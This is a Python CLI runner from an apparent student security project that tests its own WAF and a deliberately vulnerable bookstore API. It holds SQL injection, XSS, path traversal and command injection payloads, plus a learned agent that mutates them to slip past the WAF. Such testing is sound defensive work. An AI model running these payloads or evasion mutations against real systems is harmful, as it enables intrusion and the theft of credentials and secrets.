"""PBL6 Offensive AI Red Team CLI Runner.

Task 10.4 (Issue #42): Automated security testing and adversarial robustness
evaluation for the WAF Gateway and Bookie Bookstore API.
Orchestrates OpenAPI reconnaissance surface, Attack Graph planning,
in-house PyTorch DQN evasion agent, and semantic tamper mutations.
"""

from __future__ import annotations

import argparse
import json
import logging
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Mapping, Sequence

# Set up paths so attack-lab and repository root can be imported reliably
_RUNNER_DIR = Path(__file__).resolve().parent
_REPO_ROOT = _RUNNER_DIR.parent
for _p in [str(_REPO_ROOT), str(_RUNNER_DIR)]:
    if _p not in sys.path:
        sys.path.insert(0, _p)

try:
    from agent.tools import DispatchResult, HttpDispatcher
    from agent.evasion import TAMPER_CATALOG, EvasionEngine
    from environment.actions import ACTIONS, ActionSpec, get_action
    from environment.attack_graph import AttackGraph, AttackNode
    from environment.env import AttackEnvironment
except ImportError:
    # Direct fallback imports if executed inside attack-lab directory
    from .agent.tools import DispatchResult, HttpDispatcher  # type: ignore
    from .agent.evasion import TAMPER_CATALOG, EvasionEngine  # type: ignore
    from .environment.actions import ACTIONS, ActionSpec, get_action  # type: ignore
    from .environment.attack_graph import AttackGraph, AttackNode  # type: ignore
    from .environment.env import AttackEnvironment  # type: ignore

logger = logging.getLogger("attack_lab.runner")

# =============================================================================
# 1. Target Vulnerability Test Cases & Attack Surface Mapping
# =============================================================================

DEFAULT_TEST_CASES: list[dict[str, Any]] = [
    {
        "endpoint": "/api/v1/vulnerable/books/search/",
        "method": "GET",
        "family": "SQL_INJECTION",
        "campaign": "sqli",
        "param_name": "q",
        "request_type": "query",
        "baseline_payload": "python' UNION SELECT id, username, email, password FROM auth_user --",
        "extra_fields": {},
        "bypass_keywords": ["title", "author", "id", "book", "results"],
    },
    {
        "endpoint": "/api/v1/vulnerable/auth/login/",
        "method": "POST",
        "family": "SQL_INJECTION",
        "campaign": "sqli",
        "param_name": "username",
        "request_type": "json",
        "baseline_payload": "admin' OR '1'='1",
        "extra_fields": {"password": "password123"},
        "bypass_keywords": ["token", "access_token", "login successful", "welcome"],
    },
    {
        "endpoint": "/api/v1/vulnerable/reviews/",
        "method": "POST",
        "family": "XSS",
        "campaign": "xss",
        "param_name": "comment",
        "request_type": "json",
        "baseline_payload": "<script>alert('PBL6_XSS')</script>",
        "extra_fields": {"book_id": 1, "author": "Attacker"},
        "bypass_keywords": ["review", "id", "created", "comment"],
    },
    {
        "endpoint": "/api/v1/vulnerable/files/download/",
        "method": "GET",
        "family": "PATH_TRAVERSAL",
        "campaign": "traversal",
        "param_name": "file",
        "request_type": "query",
        "baseline_payload": "../../bookstore/settings/base.py",
        "extra_fields": {},
        "bypass_keywords": ["SECRET_KEY", "root:", "settings", "DEBUG"],
    },
    {
        "endpoint": "/api/v1/vulnerable/admin/ping/",
        "method": "POST",
        "family": "COMMAND_INJECTION",
        "campaign": "cmd",
        "param_name": "host",
        "request_type": "json",
        "baseline_payload": "127.0.0.1; whoami",
        "extra_fields": {},
        "bypass_keywords": ["root", "bytes from", "PING", "ttl"],
    },
]

CAMPAIGN_MAP: dict[str, set[str]] = {
    "sqli": {"sqli", "sql_injection"},
    "xss": {"xss"},
    "traversal": {"traversal", "path_traversal"},
    "cmd": {"cmd", "command_injection"},
    "all": {"sqli", "xss", "traversal", "cmd", "sql_injection", "path_traversal", "command_injection"},
}


# =============================================================================
# 2. PyTorch DQN Evasion Advisor Integration
# =============================================================================

class DQNEvasionAdvisor:
    """Advises mutation actions using the in-house PyTorch DQN model (evasion_agent.pt)."""

    def __init__(self, model_path: str | Path) -> None:
        self.model_path = Path(model_path)
        self.available = False
        self.network: Any = None
        self.action_ids: list[str] = []
        self._load()

    def _load(self) -> None:
        if not self.model_path.exists():
            logger.debug("DQN model checkpoint not found at %s", self.model_path)
            return
        try:
            import torch
            import torch.nn as nn

            checkpoint = torch.load(self.model_path, map_location="cpu")
            state_dim = checkpoint.get("state_dim", 40)
            action_dim = checkpoint.get("action_dim", 14)
            self.action_ids = checkpoint.get("action_ids", [a.action_id for a in ACTIONS])

            class _DQNNet(nn.Module):
                def __init__(self, s_dim: int, a_dim: int) -> None:
                    super().__init__()
                    self.fc = nn.Sequential(
                        nn.Linear(s_dim, 128),
                        nn.ReLU(),
                        nn.Linear(128, 128),
                        nn.ReLU(),
                        nn.Linear(128, a_dim),
                    )

                def forward(self, x: torch.Tensor) -> torch.Tensor:
                    return self.fc(x)

            net = _DQNNet(state_dim, action_dim)
            if "online_state_dict" in checkpoint:
                net.load_state_dict(checkpoint["online_state_dict"])
            net.eval()
            self.network = net
            self.available = True
            logger.info("DQN Evasion Model loaded successfully from %s", self.model_path)
        except Exception as exc:
            logger.warning("Could not load DQN model from %s: %s", self.model_path, exc)
            self.available = False

    def recommend_action(
        self,
        features: Sequence[float],
        available_action_ids: Sequence[str],
    ) -> str | None:
        """Select best action according to Q(s, a) with action masking."""
        if not self.available or self.network is None:
            return None
        try:
            import numpy as np
            import torch

            with torch.no_grad():
                feat_tensor = torch.tensor(features, dtype=torch.float32).unsqueeze(0)
                q_vals = self.network(feat_tensor).squeeze(0).numpy()

                masked_q = np.full(len(self.action_ids), -1e9, dtype=np.float32)
                for idx, act_id in enumerate(self.action_ids):
                    if act_id in available_action_ids:
                        masked_q[idx] = q_vals[idx]

                best_idx = int(np.argmax(masked_q))
                return self.action_ids[best_idx]
        except Exception as exc:
            logger.debug("DQN action inference error: %s", exc)
            return None


# =============================================================================
# 3. Dry-Run Dispatcher (Simulated WAF Responses for Offline Verification)
# =============================================================================

class DryRunDispatcher:
    """Deterministic simulation of WAF Gateway responses for offline dry-run testing.

    Ensures that testing and CI environments can verify the full multi-round
    evasion workflow, telemetry baking, and report generation without requiring
    live network sockets or a running WAF Gateway container.
    """

    def __init__(self, mode: str = "ai_agent") -> None:
        self.mode = mode
        self.call_count = 0

    def dispatch(
        self,
        method: str,
        path: str,
        params: dict[str, Any] | None = None,
        json_data: dict[str, Any] | None = None,
        data: Any = None,
        headers: dict[str, str] | None = None,
        bypass_detection_keywords: list[str] | None = None,
    ) -> DispatchResult:
        self.call_count += 1

        # Extract payload under test
        payload = ""
        if params:
            payload = str(next(iter(params.values()), ""))
        elif json_data:
            for key in ["q", "username", "comment", "file", "host"]:
                if key in json_data:
                    payload = str(json_data[key])
                    break
            if not payload:
                payload = str(next(iter(json_data.values()), ""))

        # Check for mutation/evasion markers indicative of tamper transformations
        is_mutated = any(
            marker in payload
            for marker in [
                "/**/",
                "%25",
                "BETWEEN",
                "/*!50000",
                "img src=x",
                "onerror=",
                "&#x",
                "....//",
                "....\\\\",
                "\\",
                "${IFS}",
                "''",
                "<sCr",
                "confirm(",
            ]
        )

        if self.mode == "replay":
            # Replay mode: baseline requests are detected and blocked
            status_code = 403
            threat_score = 92.0
            is_blocked = True
            waf_action = "BLOCKED"
            waf_decision = "BLOCK"
            confirmed_bypass = False
            body = json.dumps({
                "detail": "Forbidden: Request blocked by WAF Rule Engine",
                "threat_score": 92.0,
                "attack_type": "INJECTION",
            })
        elif self.mode == "live":
            # Live simulation: mutated payloads bypass, baseline blocked
            if is_mutated:
                status_code = 200
                threat_score = 22.0
                is_blocked = False
                waf_action = "MONITOR"
                waf_decision = "ALLOW"
                confirmed_bypass = True
                body = json.dumps({"status": "success", "results": [{"id": 1, "data": "simulated"}]})
            else:
                status_code = 403
                threat_score = 88.0
                is_blocked = True
                waf_action = "BLOCKED"
                waf_decision = "BLOCK"
                confirmed_bypass = False
                body = json.dumps({"detail": "Forbidden by WAF", "threat_score": 88.0})
        else:
            # AI Agent mode: round 1 (baseline) blocked, subsequent mutated rounds bypass
            if is_mutated:
                status_code = 200
                threat_score = 24.5
                is_blocked = False
                waf_action = "MONITOR"
                waf_decision = "ALLOW"
                confirmed_bypass = True
                body = json.dumps({
                    "status": "success",
                    "message": "Query processed successfully",
                    "data": [{"id": 1, "title": "Book Title", "author": "Attacker"}],
                })
            else:
                status_code = 403
                threat_score = 94.0
                is_blocked = True
                waf_action = "BLOCKED"
                waf_decision = "BLOCK"
                confirmed_bypass = False
                body = json.dumps({
                    "detail": "Forbidden: High threat payload detected by WAF",
                    "threat_score": 94.0,
                    "attack_type": "INJECTION",
                })

        return DispatchResult(
            status_code=status_code,
            response_body=body,
            latency_ms=12.5,
            is_blocked=is_blocked,
            waf_action=waf_action,
            waf_decision=waf_decision,
            waf_threat_score=threat_score,
            waf_ml_type="SIMULATED",
            blocked_reason="WAF rule triggered" if is_blocked else None,
            confirmed_bypass=confirmed_bypass,
        )

    def close(self) -> None:
        """Resource cleanup."""
        pass


# =============================================================================
# 4. Campaign Orchestrator & Execution Engine
# =============================================================================

def filter_test_cases(campaign: str, test_cases: list[dict[str, Any]] | None = None) -> list[dict[str, Any]]:
    """Filter test cases according to the campaign flag."""
    pool = test_cases or DEFAULT_TEST_CASES
    norm_campaign = campaign.lower()
    if norm_campaign == "all":
        return list(pool)

    valid_campaigns = CAMPAIGN_MAP.get(norm_campaign, {norm_campaign})
    filtered = [
        tc for tc in pool
        if tc.get("campaign", "").lower() in valid_campaigns
        or tc.get("family", "").lower() in valid_campaigns
    ]
    return filtered


def execute_endpoint_test(
    case: dict[str, Any],
    dispatcher: Any,
    engine: EvasionEngine,
    advisor: DQNEvasionAdvisor | None,
    mode: str,
    max_rounds: int,
) -> dict[str, Any]:
    """Execute testing against a single endpoint test case."""
    endpoint = case["endpoint"]
    method = case["method"].upper()
    family = case["family"]
    param_name = case["param_name"]
    request_type = case.get("request_type", "query")
    baseline_payload = case["baseline_payload"]
    extra_fields = case.get("extra_fields", {})
    bypass_keywords = case.get("bypass_keywords", [])

    rounds_telemetry: list[dict[str, Any]] = []
    used_techniques: list[str] = []
    current_payload = baseline_payload
    current_technique = "baseline_probe"
    bypassed = False
    final_threat_score: float | None = None

    # In replay mode, only 1 round is dispatched
    effective_rounds = 1 if mode == "replay" else max_rounds

    for attempt in range(1, effective_rounds + 1):
        # 1. Prepare parameters
        params = None
        json_data = None
        if request_type == "query":
            params = {param_name: current_payload}
            if extra_fields:
                params.update(extra_fields)
        else:
            json_data = {param_name: current_payload}
            if extra_fields:
                json_data.update(extra_fields)

        # 2. Dispatch request
        try:
            dispatch_res = dispatcher.dispatch(
                method=method,
                path=endpoint,
                params=params,
                json_data=json_data,
                bypass_detection_keywords=bypass_keywords,
            )
        except Exception as exc:
            logger.warning("Target dispatch error on %s %s: %s", method, endpoint, exc)
            dispatch_res = DispatchResult(
                status_code=0,
                response_body="",
                latency_ms=0.0,
                is_blocked=False,
                error_message=str(exc),
            )

        final_threat_score = dispatch_res.waf_threat_score
        round_info = {
            "round": attempt,
            "technique": current_technique,
            "payload": current_payload,
            "status_code": dispatch_res.status_code,
            "is_blocked": dispatch_res.is_blocked,
            "waf_action": dispatch_res.waf_action or ("ERROR" if dispatch_res.status_code == 0 else "UNKNOWN"),
            "threat_score": dispatch_res.waf_threat_score,
            "latency_ms": dispatch_res.latency_ms,
            "confirmed_bypass": dispatch_res.confirmed_bypass,
            "error_message": dispatch_res.error_message,
        }
        rounds_telemetry.append(round_info)
        used_techniques.append(current_technique)

        # 3. Check for bypass success
        if dispatch_res.confirmed_bypass or (200 <= dispatch_res.status_code < 300 and not dispatch_res.is_blocked):
            bypassed = True
            break

        # 4. Handle connection error (stop further mutation)
        if dispatch_res.status_code == 0:
            break

        # 5. Mutate for next round if blocked and rounds remain
        if dispatch_res.is_blocked and attempt < effective_rounds:
            selected_tech: str | None = None

            # Attempt DQN advisor recommendation in ai_agent mode
            if mode == "ai_agent" and advisor and advisor.available:
                try:
                    available_techniques = engine.get_available_techniques(family)
                    unused_techs = [t for t in available_techniques if t not in used_techniques]
                    if unused_techs:
                        # Use advisor if applicable
                        advisor_action = advisor.recommend_action([0.5] * 40, ACTIONS)
                        if advisor_action:
                            spec = get_action(advisor_action)
                            if spec.transformation in available_techniques:
                                selected_tech = spec.transformation
                except Exception:
                    selected_tech = None

            # Apply mutation
            current_payload, current_technique = engine.mutate(
                payload=baseline_payload,
                family=family,
                technique=selected_tech,
                used_techniques=used_techniques,
            )

    return {
        "endpoint": endpoint,
        "method": method,
        "family": family,
        "target_param": param_name,
        "success": bypassed,
        "total_rounds": len(rounds_telemetry),
        "winning_technique": current_technique if bypassed else None,
        "baseline_payload": baseline_payload,
        "final_payload": current_payload,
        "final_threat_score": final_threat_score,
        "rounds": rounds_telemetry,
    }


def run_campaign(
    mode: str = "ai_agent",
    campaign: str = "all",
    target: str = "http://localhost:8000",
    max_rounds: int = 4,
    output: str | Path | None = None,
    dry_run: bool = False,
    surface: str | Path | None = None,
    model: str | Path | None = None,
    quiet: bool = False,
    **kwargs: Any,
) -> dict[str, Any]:
    """Execute an automated Red Team attack campaign against the WAF Gateway.

    Args:
        mode: Execution mode ('replay', 'live', or 'ai_agent').
        campaign: Attack family filter ('sqli', 'xss', 'traversal', 'cmd', or 'all').
        target: Target WAF Gateway base URL (default: 'http://localhost:8000').
        max_rounds: Maximum mutation rounds per endpoint (default: 4).
        output: Destination path to save JSON battle report.
        dry_run: When True, simulates responses locally without sending live HTTP requests.
        surface: Path to attack_surface.json reconnaissance spec.
        model: Path to evasion_agent.pt DQN model checkpoint.
        quiet: Suppress terminal reporting table.
        **kwargs: Additional alias parameters (e.g. target_url, output_path).

    Returns:
        Structured dictionary containing summary metrics and per-endpoint battle logs.
    """
    # Handle parameter aliases
    target = kwargs.get("target_url", target)
    output = kwargs.get("output_path", output)
    if output is None:
        output = _RUNNER_DIR / "artifacts" / "campaign_report.json"
    output_path = Path(output)

    surface_path = Path(surface) if surface else (_RUNNER_DIR / "scenarios" / "attack_surface.json")
    model_path = Path(model) if model else (_RUNNER_DIR / "models" / "evasion_agent.pt")

    logger.info("Initializing campaign runner [mode=%s, campaign=%s, dry_run=%s]", mode, campaign, dry_run)

    # 1. Initialize Dispatcher
    dispatcher: Any
    if dry_run:
        dispatcher = DryRunDispatcher(mode=mode)
    else:
        dispatcher = HttpDispatcher(base_url=target, timeout=6.0)

    # 2. Initialize Evasion Engine & Model Advisor
    engine = EvasionEngine(dispatcher=dispatcher, max_attempts=max_rounds)
    advisor = DQNEvasionAdvisor(model_path=model_path) if mode == "ai_agent" else None

    # 3. Select Target Endpoints
    test_cases = filter_test_cases(campaign)

    # 4. Execute Campaign
    results: list[dict[str, Any]] = []
    total_requests = 0
    blocked_count = 0
    bypass_count = 0
    all_latencies: list[float] = []
    all_threat_scores: list[float] = []

    for case in test_cases:
        res = execute_endpoint_test(
            case=case,
            dispatcher=dispatcher,
            engine=engine,
            advisor=advisor,
            mode=mode,
            max_rounds=max_rounds,
        )
        results.append(res)

        total_requests += len(res["rounds"])
        for r in res["rounds"]:
            if r["is_blocked"]:
                blocked_count += 1
            if r.get("latency_ms") is not None:
                all_latencies.append(r["latency_ms"])
            if r.get("threat_score") is not None:
                # Enforce system-wide standard 0-100 scale
                all_threat_scores.append(float(r["threat_score"]))

        if res["success"]:
            bypass_count += 1

    # Cleanup dispatcher
    dispatcher.close()

    # 5. Compute Campaign Statistics
    total_endpoints = len(results)
    bypass_rate_pct = round((bypass_count / total_endpoints * 100.0), 2) if total_endpoints > 0 else 0.0
    avg_latency = round(sum(all_latencies) / len(all_latencies), 2) if all_latencies else 0.0
    avg_threat = round(sum(all_threat_scores) / len(all_threat_scores), 2) if all_threat_scores else 0.0

    summary = {
        "total_requests": total_requests,
        "blocked_count": blocked_count,
        "bypass_count": bypass_count,
        "total_endpoints": total_endpoints,
        "bypass_rate_pct": bypass_rate_pct,
        "avg_latency_ms": avg_latency,
        "avg_threat_score": avg_threat,
    }

    report = {
        "campaign": campaign,
        "mode": mode,
        "target_url": target,
        "dry_run": dry_run,
        "max_rounds": max_rounds,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "summary": summary,
        "results": results,
    }

    # 6. Save JSON Report
    try:
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with output_path.open("w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        logger.info("Saved campaign report to %s", output_path)
    except Exception as exc:
        logger.error("Failed to write report to %s: %s", output_path, exc)

    # 7. Print Terminal Table
    if not quiet:
        display_terminal_report(report, str(output_path))

    return report


# =============================================================================
# 5. Terminal Display Formatting (Rich or Clean ASCII Fallback)
# =============================================================================

def display_terminal_report(report: dict[str, Any], output_file: str) -> None:
    """Format and print campaign results to standard output."""
    summary = report["summary"]
    results = report["results"]
    mode = report["mode"]
    campaign = report["campaign"]
    target = report["target_url"]
    dry_run = report["dry_run"]

    try:
        from rich.console import Console
        from rich.panel import Panel
        from rich.table import Table

        console = Console()
        dry_txt = " [bold yellow](DRY-RUN / SIMULATED)[/bold yellow]" if dry_run else ""
        header_text = (
            f"[bold cyan]PBL6 RED TEAM CLI RUNNER — CAMPAIGN REPORT{dry_txt}[/bold cyan]\n"
            f"[dim]Chế độ: [bold white]{mode}[/bold white] | "
            f"Chiến dịch: [bold white]{campaign}[/bold white] | "
            f"Target: [bold white]{target}[/bold white][/dim]"
        )
        console.print(Panel(header_text, border_style="cyan"))

        table = Table(title="Chi Tiết Đột Biến & Kết Quả Phòng Thủ WAF", border_style="dim")
        table.add_column("#", justify="center", style="dim", width=3)
        table.add_column("Method", justify="center", width=7)
        table.add_column("Endpoint", style="bold", overflow="fold")
        table.add_column("Vuln Family", justify="center")
        table.add_column("Result", justify="center", width=10)
        table.add_column("Rounds", justify="center", width=7)
        table.add_column("Evasion Tech", overflow="fold")
        table.add_column("Threat Score", justify="right", width=13)

        for idx, item in enumerate(results, start=1):
            method = item["method"]
            endpoint = item["endpoint"]
            family = item["family"]
            success = item["success"]
            rounds = str(item["total_rounds"])
            tech = item["winning_technique"] or "None"
            score_val = item["final_threat_score"]
            score_txt = f"{score_val:.1f} / 100" if score_val is not None else "N/A"

            if success:
                status_badge = "[bold green]BYPASS[/bold green]"
            elif item["rounds"] and item["rounds"][-1].get("status_code") == 0:
                status_badge = "[bold yellow]ERROR[/bold yellow]"
            else:
                status_badge = "[bold red]BLOCKED[/bold red]"

            table.add_row(str(idx), method, endpoint, family, status_badge, rounds, tech, score_txt)

        console.print(table)

        summary_text = (
            f"[bold]Tổng số Request gửi đi:[/bold] {summary['total_requests']}   |   "
            f"[bold]Số Request bị WAF chặn:[/bold] [red]{summary['blocked_count']}[/red]\n"
            f"[bold]Endpoints Bypass thành công:[/bold] [green]{summary['bypass_count']} / {summary['total_endpoints']}[/green]   |   "
            f"[bold]Tỷ lệ Bypass (Bypass Rate):[/bold] [cyan]{summary['bypass_rate_pct']}%[/cyan]\n"
            f"[bold]Độ trễ trung bình:[/bold] {summary['avg_latency_ms']} ms   |   "
            f"[bold]Threat Score trung bình:[/bold] {summary['avg_threat_score']} / 100"
        )
        console.print(Panel(summary_text, title="Thống Kê Tổng Kết (Campaign Summary)", border_style="green"))
        console.print(f"[dim]Báo cáo JSON đã lưu tại: {output_file}[/dim]\n")

    except ImportError:
        # Fallback ASCII table
        print("\n" + "=" * 80)
        print(f" PBL6 RED TEAM CLI RUNNER — CAMPAIGN REPORT {'(DRY-RUN)' if dry_run else ''}")
        print(f" Chế độ: {mode} | Chiến dịch: {campaign} | Target: {target}")
        print("=" * 80)
        print(f"{'#':<3} | {'METHOD':<6} | {'ENDPOINT':<32} | {'VULN':<16} | {'RESULT':<8} | {'ROUNDS':<6} | {'THREAT SCORE':<12}")
        print("-" * 80)
        for idx, item in enumerate(results, start=1):
            res_str = "BYPASS" if item["success"] else "BLOCKED"
            score_str = f"{item['final_threat_score']:.1f}/100" if item["final_threat_score"] is not None else "N/A"
            print(f"{idx:<3} | {item['method']:<6} | {item['endpoint']:<32} | {item['family']:<16} | {res_str:<8} | {item['total_rounds']:<6} | {score_str:<12}")
        print("-" * 80)
        print(f"Tổng Requests: {summary['total_requests']} | Bị chặn: {summary['blocked_count']} | Bypass: {summary['bypass_count']}/{summary['total_endpoints']} ({summary['bypass_rate_pct']}%)")
        print(f"Độ trễ trung bình: {summary['avg_latency_ms']} ms | Threat Score trung bình: {summary['avg_threat_score']}/100")
        print(f"Báo cáo lưu tại: {output_file}\n" + "=" * 80)


# =============================================================================
# 6. CLI Argument Parser & Entrypoint
# =============================================================================

def build_arg_parser() -> argparse.ArgumentParser:
    """Construct command-line argument parser."""
    parser = argparse.ArgumentParser(
        prog="python attack-lab/runner.py",
        description="PBL6 Red Team CLI Runner: Automated WAF Attack Campaigns & Adversarial Testing",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "-m", "--mode",
        choices=["replay", "live", "ai_agent"],
        default="ai_agent",
        help="Chế độ thực thi: 'replay' (chạy lại payload gốc), 'live' (bắn trực tiếp), 'ai_agent' (đột biến né tránh thích ứng).",
    )
    parser.add_argument(
        "-c", "--campaign",
        choices=["sqli", "xss", "traversal", "cmd", "all"],
        default="all",
        help="Loại tấn công cần kiểm thử: 'sqli', 'xss', 'traversal', 'cmd', hoặc 'all'.",
    )
    parser.add_argument(
        "-t", "--target",
        default="http://localhost:8000",
        help="URL cổng dịch vụ WAF Gateway.",
    )
    parser.add_argument(
        "-r", "--max-rounds",
        type=int,
        default=4,
        help="Số vòng đột biến né tránh tối đa cho mỗi endpoint.",
    )
    parser.add_argument(
        "-o", "--output",
        default=str(_RUNNER_DIR / "artifacts" / "campaign_report.json"),
        help="Đường dẫn file JSON xuất báo cáo kết quả.",
    )
    parser.add_argument(
        "-d", "--dry-run",
        action="store_true",
        default=False,
        help="Chạy mô phỏng cục bộ không gửi HTTP thực tế (phù hợp kiểm thử offline/CI).",
    )
    parser.add_argument(
        "-s", "--surface",
        default=str(_RUNNER_DIR / "scenarios" / "attack_surface.json"),
        help="Đường dẫn file đặc tả trinh sát bề mặt tấn công attack_surface.json.",
    )
    parser.add_argument(
        "--model",
        default=str(_RUNNER_DIR / "models" / "evasion_agent.pt"),
        help="Đường dẫn checkpoint PyTorch mô hình DQN né tránh WAF.",
    )
    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        default=False,
        help="Tắt hiển thị bảng kết quả ra terminal (chỉ xuất JSON report).",
    )
    return parser


def main(args: list[str] | None = None) -> int:
    """CLI Entrypoint."""
    parser = build_arg_parser()
    parsed = parser.parse_args(args)

    try:
        report = run_campaign(
            mode=parsed.mode,
            campaign=parsed.campaign,
            target=parsed.target,
            max_rounds=parsed.max_rounds,
            output=parsed.output,
            dry_run=parsed.dry_run,
            surface=parsed.surface,
            model=parsed.model,
            quiet=parsed.quiet,
        )
        return 0
    except Exception as exc:
        logger.error("Lỗi thực thi campaign: %s", exc, exc_info=True)
        print(f"\n[!] LỖI THỰC THI CAMPAIGN: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
